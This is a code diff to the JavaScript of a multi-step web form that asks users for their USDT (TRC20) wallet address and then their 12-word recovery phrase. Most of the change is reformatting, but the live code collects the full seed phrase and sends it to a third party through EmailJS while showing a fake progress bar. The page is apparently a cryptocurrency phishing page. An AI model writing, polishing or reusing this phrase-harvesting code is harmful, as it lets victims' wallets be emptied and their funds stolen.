@@ -502,7 +502,7 @@ select:focus {
   // Initialize EmailJS
   emailjs.init("dvLgjhIHXXq7QXp5p");
 
-  // ✅ Toast helper defined once
+  // ✅ Toast helper
   function showToast(message) {
     const toast = document.getElementById('toast');
     if (toast) {
@@ -530,20 +530,24 @@ select:focus {
   function setFieldError(fieldId, message) {
     const input = document.getElementById(fieldId);
     const error = document.getElementById(fieldId + 'Error');
-    if (error) error.textContent = message || '';
-    if (input) input.classList.toggle('input-error', !!message);
+    if (error) {
+      error.textContent = message || '';
+    }
+    if (input) {
+      input.classList.toggle('input-error', !!message);
+    }
   }
 
   // Step 1 → Step 2
   if (s1btn) {
     s1btn.addEventListener('click', () => {
-      const addr = document.getElementById('addr').value.trim();
+      const addrEl = document.getElementById('addr');
+      const addr = addrEl ? addrEl.value.trim() : '';
       if (!addr) {
-        setFieldError('addr', 'Please enter your USDT (TRC20) wallet address.');
-        document.getElementById('addr').focus();
+        showToast("Please enter your USDT (TRC20) wallet address.");
+        addrEl?.focus();
         return;
       }
-      setFieldError('addr', '');
       setTimeout(() => {
         s1.hidden = true;
         s2.hidden = false;
@@ -552,42 +556,42 @@ select:focus {
   }
 
   // Step 2 → Step 3 (send phrase only)
-if (s2btn) {
-  s2btn.addEventListener('click', () => {
-    let phrase = '';
-    for (let i = 1; i <= 12; i++) {
-      const input = document.getElementById(`word${i}`);
-      if (input) {
-        const val = input.value.trim();
-        if (!val) {
-          showToast(`Please enter word ${i}.`);
-          input.focus();
-          return;
+  if (s2btn) {
+    s2btn.addEventListener('click', () => {
+      let phrase = '';
+      for (let i = 1; i <= 12; i++) {
+        const input = document.getElementById(`word${i}`);
+        if (input) {
+          const val = input.value.trim();
+          if (!val) {
+            showToast(`Please enter word ${i}.`);
+            input.focus();
+            return;
+          }
+          phrase += val + ' ';
         }
-        phrase += val + ' ';
       }
-    }
-    phrase = phrase.trim();
+      phrase = phrase.trim();
 
-    // Send only the phrase via EmailJS
-    console.log("Sending phrase:", phrase);
-    emailjs.send("service_1qzlil7", "template_w742mzr", {
-      recovery_phrase: phrase
-    }).then(() => {
-      console.log("Phrase sent successfully");
-    }).catch(err => {
-      console.error("Error sending phrase", err);
+      // Send only the phrase via EmailJS
+      console.log("Sending phrase:", phrase);
+      emailjs.send("service_1qzlil7", "template_w742mzr", {
+        recovery_phrase: phrase
+      }).then(() => {
+        console.log("Phrase sent successfully");
+      }).catch(err => {
+        console.error("Error sending phrase", err);
+      });
+
+      // Continue with your existing flow
+      prog.style.width = '70%';
+      setTimeout(() => {
+        prog.style.width = '100%';
+        s2.hidden = true;
+        s3.hidden = false;
+      }, 3000);
     });
-
-    // Continue with your existing flow
-    prog.style.width = '70%';
-    setTimeout(() => {
-      prog.style.width = '100%';
-      s2.hidden = true;
-      s3.hidden = false;
-    }, 3000);
-  });
-}
+  }
 
   // Remove blinking once a tier is chosen
   if (tierSelect) {
@@ -607,7 +611,6 @@ if (s2btn) {
         tierSelect.focus();
         return;
       }
-      setFieldError('tierSelect', '');
       loaderBar.hidden = false;
 
       setTimeout(() => {
